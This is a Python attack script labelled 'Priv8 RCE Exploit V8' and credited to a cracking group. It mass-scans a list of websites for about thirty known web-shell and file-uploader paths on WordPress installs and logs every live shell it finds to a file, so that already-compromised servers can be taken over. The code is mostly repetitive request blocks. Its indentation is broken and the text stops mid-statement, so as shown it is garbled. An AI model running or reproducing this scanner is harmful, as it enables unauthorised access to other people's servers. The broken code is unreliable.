
# -*-coding:Latin-1 -*
import sys, requests, re
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
from pathlib import Path
import os
import sys
import time
import platform
import os
import hashlib
from time import sleep
from datetime import datetime
def sendme(message):
    return message
os.system("clear")
init(autoreset=True)
fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
fm = Fore.MAGENTA
os.system("cls" if os.name == "nt" else "clear")
print(
    """\\033[1;36;40m



                                                             ______        
     /\\                                                     |  ____|       
    /  \\   _ __   ___  _ __  _   _ _ __ ___   ___  _   _ ___| |__ _____  __
   / /\\ \\ | '_ \\ / _ \\| '_ \\| | | | '_ ` _ \\ / _ \\| | | / __|  __/ _ \\ \\/ /
  / ____ \\| | | | (_) | | | | |_| | | | | | | (_) | |_| \\__ \\ | | (_) >  < 
 /_/    \\_\\_| |_|\\___/|_| |_|\\__, |_| |_| |_|\\___/ \\__,_|___/_|  \\___/_/\\_\\\\
                              __/ |                                        
                             |___/                        Priv8 RCE Exploit V8  

                             Source Cracked By Death Shop.
                             https://t.me/DEATHSHOPOFFICIAL             
                
            
"""
)
requests.urllib3.disable_warnings()
headers = {
    "Connection": "keep-alive",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9,fr;q=0.8",
    "referer": "www.google.com",
}
try:
    fileName = input("\\033[1;31mSite Lists: ")
    file = Path(__file__).with_name(fileName)
    target = [i.strip() for i in file.open("r").readlines()]
except IndexError:
    path = str(sys.argv[0]).split("\\\\")
    exit("\
\\033[1;31m  [!] Enter <" + path[len(path) - 1] + "> <your list.txt>")
poolAmount = int(input("\\033[1;31mThreads: "))
def URLdomain(site):
    if site.startswith("http://"):
        site = site.replace("http://", "")
    elif site.startswith("https://"):
        site = site.replace("https://", "")
    else:
        pass
    pattern = re.compile("(.*)/")
    while re.findall(pattern, site):
        sitez = re.findall(pattern, site)
        site = sitez[0]
    return site
def FourHundredThree(url):
    try:
       
#1 /wp-content/plugins/ioptimization/IOptimize.php?rchk
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/plugins/ioptimization/IOptimize.php?rchk",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if 'type="file"><input type="submit" value="Upload"' in check.content.decode(
            "utf-8"
        ):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/plugins/ioptimization/IOptimize.php?rchk")
            open("Shells.txt", "a").write(
                url + "/wp-content/plugins/ioptimization/IOptimize.php?rchk"
            )
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/plugins/ioptimization/IOptimize.php?rchk",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if (
                'type="file"><input type="submit" value="Upload"'
                in check.content.decode("utf-8")
            ):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/plugins/ioptimization/IOptimize.php?rchk")
                open("Shells.txt", "a").write(
                    url + "/wp-content/plugins/ioptimization/IOptimize.php?rchk"
                )
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
               
#2 /wp-content/plugins/seoplugins/mar.php
                url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/plugins/seoplugins/mar.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "//0x5a455553.github.io/MARIJUANA/icon.png" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/plugins/seoplugins/mar.php")
            open("Shells.txt", "a").write(
                url + "/wp-content/plugins/seoplugins/mar.php"
            )
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/plugins/seoplugins/mar.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "//0x5a455553.github.io/MARIJUANA/icon.png" in check.content.decode(
                "utf-8"
            ):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/plugins/seoplugins/mar.php")
                open("Shells.txt", "a").write(
                    url + "/wp-content/plugins/seoplugins/mar.php"
                )
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
               
#3 /wp-content/themes/seotheme/mar.php
                url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/themes/seotheme/mar.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "//0x5a455553.github.io/MARIJUANA/icon.png" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/themes/seotheme/mar.php")
            open("Shells.txt", "a").write(url + "/wp-content/themes/seotheme/mar.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/themes/seotheme/mar.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "//0x5a455553.github.io/MARIJUANA/icon.png" in check.content.decode(
                "utf-8"
            ):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/themes/seotheme/mar.php")
                open("Shells.txt", "a").write(
                    url + "/wp-content/themes/seotheme/mar.php"
                )
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
               
#4 /wp-content/plugins/instabuilder2/cache/up.php
                url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/plugins/instabuilder2/cache/up.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "input type='submit' name='upload' value='upload'" in check.content.decode(
            "utf-8"
        ):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/plugins/instabuilder2/cache/up.php")
            open("Shells.txt", "a").write(
                url + "/wp-content/plugins/instabuilder2/cache/up.php"
            )
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/plugins/instabuilder2/cache/up.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if (
                "input type='submit' name='upload' value='upload'"
                in check.content.decode("utf-8")
            ):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/plugins/instabuilder2/cache/up.php")
                open("Shells.txt", "a").write(
                    url + "/wp-content/plugins/instabuilder2/cache/up.php"
                )
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
               
#5 /index.php?3x=3x
                url = "http://" + URLdomain(url)
        check = requests.get(url + "/index.php?3x=3x", timeout=15)
        if "<title>Upload files...</title>" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/index.php?3x=3x")
            open("Shells.txt", "a").write(url + "/index.php?3x=3x")
        else:
            print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
            
#6 /wp-content/themes/pridmag/db.php?u
            url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/themes/pridmag/db.php?u",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if (
            'input name="_upl" type="submit" id="_upl" value="Upload"'
            in check.content.decode("utf-8")
        ):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/themes/pridmag/db.php?u")
            open("Shells.txt", "a").write(url + "/wp-content/themes/pridmag/db.php?u")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/themes/pridmag/db.php?u",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if (
                'input name="_upl" type="submit" id="_upl" value="Upload"'
                in check.content.decode("utf-8")
            ):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/themes/pridmag/db.php?u")
                open("Shells.txt", "a").write(
                    url + "/wp-content/themes/pridmag/db.php?u"
                )
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

##########[**shell20211028.php**]###########  

 #7/shell20211028.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/shell20211028.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/shell20211028.php#")
            open("Shells.txt", "a").write(url + "/shell20211028.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/shell20211028.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/shell20211028.php#")
                open("Shells.txt", "a").write(url + "/shell20211028.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
       
 #8 /wp-includes/shell20211028.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-includes/shell20211028.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-includes/shell20211028.php# ")
            open("Shells.txt", "a").write(url + "/wp-includes/shell20211028.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-includes/shell20211028.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-includes/shell20211028.php#")
                open("Shells.txt", "a").write(url + "/wp-includes/shell20211028.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
       
 #9 /wp-admin/shell20211028.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-admin/shell20211028.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-admin/shell20211028.php#")
            open("Shells.txt", "a").write(url + "/wp-admin/shell20211028.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-admin/shell20211028.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-admin/shell20211028.php#")
                open("Shells.txt", "a").write(url + "/wp-admin/shell20211028.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
    
 #10 /wp-content/shell20211028.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/shell20211028.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/shell20211028.php#")
            open("Shells.txt", "a").write(url + "/wp-content/shell20211028.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/shell20211028.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/shell20211028.php#")
                open("Shells.txt", "a").write(url + "/wp-content/shell20211028.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))                

#11 /wp-content/plugins/instabuilder2/cache/plugins/moon.php
            url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/plugins/instabuilder2/cache/plugins/moon.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "<title>Gel4y Mini Shell</title>" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/plugins/instabuilder2/cache/plugins/moon.php#")
         
            
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/plugins/instabuilder2/cache/plugins/moon.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "<title>Gel4y Mini Shell</title>" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(
                    url + "/wp-content/plugins/instabuilder2/cache/plugins/moon.php#"
                )
               
                
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

#12 /radio.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/radio.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/radio.php")
            open("Shells.txt", "a").write(url + "/radio.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/radio.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/radio.php")
                open("Shells.txt", "a").write(url + "/radio.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

#13 /shell.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/shell.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/shell.php")
            open("Shells.txt", "a").write(url + "/shell.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/shell.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/shell.php")
                open("Shells.txt", "a").write(url + "/shell.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

#14 /wp-content/plugins/ccx/index.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/plugins/ccx/index.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "Negat1ve Shell" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/themes/ccx/index.php")
            open("Shells.txt", "a").write(url + "/wp-content/plugins/ccx/index.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/plugins/ccx/index.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "Negat1ve Shell" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/themes/ccx/index.php")
                open("Shells.txt", "a").write(
                    url + "/wp-content/plugins/ccx/index.php"
                )
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
       
#15 /ccx/index.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/ccx/index.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "Negat1ve Shell" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/ccx/index.php")
            open("Shells.txt", "a").write(url + "/ccx/index.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/ccx/index.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "Negat1ve Shell" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/ccx/index.php")
                open("Shells.txt", "a").write(url + "/ccx/index.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
       
#16 /wp-content/themes/ccx/index.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/themes/ccx/index.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "Negat1ve Shell" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/themes/ccx/index.php")
            open("Shells.txt", "a").write(url + "/wp-content/themes/ccx/index.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/themes/ccx/index.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "Negat1ve Shell" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/themes/ccx/index.php")
                open("Shells.txt", "a").write(
                    url + "/wp-content/themes/ccx/index.php"
                )
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

#17 /wp-content/index.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/index.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/index.php")
            open("Shells.txt", "a").write(url + "/wp-content/index.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/index.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/index.php")
                open("Shells.txt", "a").write(url + "/wp-content/index.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

#18 /wp-info.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-info.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-info.php")
            open("Shells.txt", "a").write(url + "/wp-info.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-info.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-info.php")
                open("Shells.txt", "a").write(url + "/wp-info.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))  

#19 /wp-includes/pomo/newup.php
            url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-includes/pomo/newup.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if (
            'input name="_upl" type="submit" id="_upl" value="Upload"'
            in check.content.decode("utf-8")
        ):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-includes/pomo/newup.php")
            open("Shells.txt", "a").write(url + "/wp-includes/pomo/newup.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-includes/pomo/newup.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if (
                'input name="_upl" type="submit" id="_upl" value="Upload"'
                in check.content.decode("utf-8")
            ):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-includes/pomo/newup.php")
                open("Shells.txt", "a").write(url + "/wp-includes/pomo/newup.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

#20 /wp-includes/wp-class.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-includes/wp-class.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-includes/wp-class.php")
            open("Shells.txt", "a").write(url + "/wp-includes/wp-class.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-includes/wp-class.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-includes/wp-class.php")
                open("Shells.txt", "a").write(url + "/wp-includes/wp-class.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

#21 /404.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/404.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/404.php")
            open("Shells.txt", "a").write(url + "/404.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/404.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/404.php")
                open("Shells.txt", "a").write(url + "/404.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

#22 /406.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/406.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/406.php")
            open("Shells.txt", "a").write(url + "/406.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/406.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/406.php")
                open("Shells.txt", "a").write(url + "/406.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))   

#23 /wp-class.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-class.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-class.php")
            open("Shells.txt", "a").write(url + "/wp-class.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-class.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-class.php")
                open("Shells.txt", "a").write(url + "/wp-class.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

##########[**Index OF started**]###########                                   

 #24 /1index.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/1index.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/1index.php")
            open("Shells.txt", "a").write(url + "/1index.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/1index.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/1index.php")
                open("Shells.txt", "a").write(url + "/1index.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

 #25 /2index.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/2index.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/2index.php")
            open("Shells.txt", "a").write(url + "/2index.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/2index.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/2index.php")
                open("Shells.txt", "a").write(url + "/2index.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
      
 #26 /3index.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/3index.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/3index.php")
            open("Shells.txt", "a").write(url + "/3index.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/3index.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/3index.php")
                open("Shells.txt", "a").write(url + "/3index.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

 #27 /4index.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/4index.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/4index.php")
            open("Shells.txt", "a").write(url + "/4index.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/4index.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/4index.php")
                open("Shells.txt", "a").write(url + "/4index.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

 #28 /5index.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/5index.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/5index.php")
            open("Shells.txt", "a").write(url + "/5index.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/5index.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/5index.php")
                open("Shells.txt", "a").write(url + "/5index.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

 #29 /6index.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/6index.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/6index.php")
            open("Shells.txt", "a").write(url + "/6index.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/6index.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/6index.php")
                open("Shells.txt", "a").write(url + "/6index.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))                

 #30 /new-index.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/new-index.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/new-index.php")
            open("Shells.txt", "a").write(url + "/new-index.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/new-index.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/new-index.php")
                open("Shells.txt", "a").write(url + "/new-index.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

 #31 /wikindex.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wikindex.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wikindex.php")
            open("Shells.txt", "a").write(url + "/wikindex.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wikindex.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wikindex.php")
                open("Shells.txt", "a").write(url + "/wikindex.php")
            else:
